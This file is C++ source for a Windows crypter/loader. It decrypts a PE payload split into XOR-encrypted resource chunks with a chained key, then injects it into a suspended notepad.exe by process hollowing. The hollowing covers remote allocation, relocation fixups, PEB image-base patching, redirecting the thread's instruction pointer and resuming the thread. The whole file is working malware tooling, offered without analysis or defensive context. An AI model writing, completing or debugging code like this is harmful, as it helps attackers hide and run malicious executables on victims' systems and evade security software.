#include <windows.h>
#include <cstdint>
#include <vector>
#include <cstdio>

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

#pragma pack(push, 1)
struct PayloadIndex {
    uint32_t magic;
    uint8_t  first_key;
    uint32_t total_size;
    uint16_t chunk_count;
    uint16_t first_chunk_id;
    uint32_t crc32;
};
#pragma pack(pop)

unsigned char* LoadResourceByID(int id, DWORD* size) {
    HMODULE hMod = GetModuleHandle(NULL);
    HRSRC hRes = FindResourceA(hMod, MAKEINTRESOURCEA(id), "BIN");
    if (!hRes) return nullptr;
    HGLOBAL hGlob = LoadResource(hMod, hRes);
    if (!hGlob) return nullptr;
    *size = SizeofResource(hMod, hRes);
    return (unsigned char*)LockResource(hGlob);
}

uint32_t CalculateCRC32(const char* data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= (uint32_t)(unsigned char)data[i];
        for (int j = 0; j < 8; j++)
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
    }
    return ~crc;
}

void D(const char* msg, const char* title = "DEBUG") {
    MessageBoxA(NULL, msg, title, MB_OK);
}

std::vector<char> ReconstructFragmentedPayload() {
    char buf[512];

    D("1. Loading index from ID 999...");

    DWORD indexSize = 0;
    unsigned char* indexData = LoadResourceByID(999, &indexSize);
    if (!indexData || indexSize < sizeof(PayloadIndex)) {
        D("Failed to load index (ID 999)", "ERROR");
        return {};
    }

    PayloadIndex* idx = (PayloadIndex*)indexData;
    if (idx->magic != 0xCAFEBABE) {
        D("Invalid magic in index", "ERROR");
        return {};
    }

    sprintf(buf, "Index loaded!\nTotal size: %u\nChunks: %u\nFirst key: 0x%02X\nFirst chunk ID: %u",
        idx->total_size, idx->chunk_count, idx->first_key, idx->first_chunk_id);
    D(buf, "INDEX OK");

    std::vector<char> payload;
    payload.reserve(idx->total_size);
    uint8_t key = idx->first_key;
    std::vector<char> prev_decrypted;

    for (int i = 0; i < idx->chunk_count; ++i) {
        int resId = idx->first_chunk_id + i;
        sprintf_s(buf, "Loading chunk %d (ID %d)...", i, resId);
        D(buf);

        DWORD size = 0;
        unsigned char* enc = LoadResourceByID(resId, &size);
        if (!enc || size == 0) {
            D("Failed to load chunk!", "ERROR");
            return {};
        }

        std::vector<char> decrypted(size);
        for (DWORD j = 0; j < size; ++j) decrypted[j] = enc[j] ^ key;

        payload.insert(payload.end(), decrypted.begin(), decrypted.end());
        prev_decrypted = std::move(decrypted);

        sprintf_s(buf, "Chunk %d decrypted with key 0x%02X (%zu bytes)", i, key, decrypted.size());
        D(buf, "DECRYPTED");

        if (i < idx->chunk_count - 1) {
            uint32_t crc = CalculateCRC32(prev_decrypted.data(), prev_decrypted.size());
            key = (uint8_t)(crc ^ (crc >> 8) ^ (crc >> 16) ^ (crc >> 24));
        }
    }

    if (payload.size() != idx->total_size) {
        D("Size mismatch!", "ERROR");
        return {};
    }
    if (payload[0] != 'M' || payload[1] != 'Z') {
        D("Not a valid PE!", "ERROR");
        return {};
    }
    if (CalculateCRC32(payload.data(), payload.size()) != idx->crc32) {
        D("CRC check failed!", "ERROR");
        return {};
    }

    D("FULL RECONSTRUCTION SUCCESS!", "VICTORY");
    return payload;
}
bool ValidateAndExecutePayload(char* payload, uint32_t payloadSize) {
    
    // Use your EXACT previous working code:
    // Validate PE header (MZ)
    if (payload[0] != 'M' || payload[1] != 'Z') {
        MessageBoxA(NULL, "[!] Invalid PE signature after decryption.", "Error", MB_ICONERROR);
        return false;
    }

    // Parse PE headers
    BYTE* pe = (BYTE*)payload;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        MessageBoxA(NULL, "[!] NT signature invalid.", "Error", MB_ICONERROR);
        return false;
    }

    // Create suspended target process (notepad.exe)
    PROCESS_INFORMATION pi;
    STARTUPINFOA si = { sizeof(si) };
    char cmdLine[] = "C:\\Windows\\System32\\notepad.exe";

    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        MessageBoxA(NULL, "[!] Failed to create target process.", "Error", MB_ICONERROR);
        return false;
    }

    // Prepare to modify thread context
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL | CONTEXT_INTEGER | CONTEXT_CONTROL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        MessageBoxA(NULL, "[!] GetThreadContext failed.", "Error", MB_ICONERROR);
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Attempt to allocate memory at original ImageBase first
    LPVOID remoteImage = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)nt->OptionalHeader.ImageBase,
        nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // Fallback: allocate anywhere if base is already taken
    if (!remoteImage) {
        remoteImage = VirtualAllocEx(pi.hProcess, NULL,
            nt->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (!remoteImage) {
            MessageBoxA(NULL, "[!] VirtualAllocEx failed.", "Error", MB_ICONERROR);
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        // Adjust ImageBase in PE headers
        nt->OptionalHeader.ImageBase = (ULONGLONG)remoteImage;
    }

   ULONGLONG originalImageBase = nt->OptionalHeader.ImageBase;
ULONGLONG delta = (ULONGLONG)remoteImage - originalImageBase;

if (delta != 0 && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
    IMAGE_DATA_DIRECTORY relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(pe + relocDir.VirtualAddress);
    SIZE_T processed = 0;

    while (processed < relocDir.Size) {
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* relocData = (WORD*)(reloc + 1);

        for (DWORD i = 0; i < count; ++i) {
            DWORD type = relocData[i] >> 12;
            DWORD offset = relocData[i] & 0xFFF;

            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG* patchAddr = (ULONGLONG*)(pe + reloc->VirtualAddress + offset);
                *patchAddr += delta;
            }
        }

        processed += reloc->SizeOfBlock;
        reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
    }

    // ✅ Set the new base AFTER relocations
    nt->OptionalHeader.ImageBase = (ULONGLONG)remoteImage;
}


    // === Write headers ===
    SIZE_T written = 0;
    WriteProcessMemory(pi.hProcess, remoteImage, pe, nt->OptionalHeader.SizeOfHeaders, &written);

    // === Write sections ===
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        LPVOID dest = (BYTE*)remoteImage + sections[i].VirtualAddress;
        LPVOID src = pe + sections[i].PointerToRawData;
        SIZE_T sectionSize = std::max(sections[i].SizeOfRawData, sections[i].Misc.VirtualSize);

        BYTE* padded = new BYTE[sectionSize];
        ZeroMemory(padded, sectionSize);
        memcpy(padded, src, sections[i].SizeOfRawData);

        WriteProcessMemory(pi.hProcess, dest, padded, sectionSize, &written);
        delete[] padded;
    }

       // === PEB fix – dynamic resolve (works in release, no linker error) ===
        // PEB update – dynamic resolve (100% works in release)
        // PEB update – dynamic resolve, 100% works in release
       // PEB update – dynamic resolve (100% works in release, no errors)
    using pNtQuery = NTSTATUS(NTAPI*)(HANDLE, int, PVOID, ULONG, PULONG);
    static pNtQuery pNt = nullptr;
    if (!pNt) {
        pNt = (pNtQuery)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
        if (!pNt) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }
    }

    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG returnLength = 0;
    if (pNt(pi.hProcess, 0, &pbi, sizeof(pbi), &returnLength) != 0) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    PVOID pebBase = (BYTE*)pbi.PebBaseAddress + 0x10;
    WriteProcessMemory(pi.hProcess, pebBase, &nt->OptionalHeader.ImageBase, sizeof(ULONGLONG), NULL);
    // Set RIP to new PE entry point
    ctx.Rip = (ULONGLONG)remoteImage + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    // Flush instruction cache and resume
    FlushInstructionCache(pi.hProcess, remoteImage, nt->OptionalHeader.SizeOfImage);
    ResumeThread(pi.hThread);

    // Clean up handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}
// ====================================================================
// WinMain – release mode (no popups, no test file)
// ====================================================================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    auto payload = ReconstructFragmentedPayload();
    if (payload.empty()) {
        D("Reconstruction failed", "FATAL");
        return -1;
    }

    D("Starting hollowing...", "HOLLOW");

    if (!ValidateAndExecutePayload(payload.data(), (uint32_t)payload.size())) {
        D("Hollowing failed", "FATAL");
        return -1;
    }

    D("Payload executed successfully", "DONE");
    return 0;
}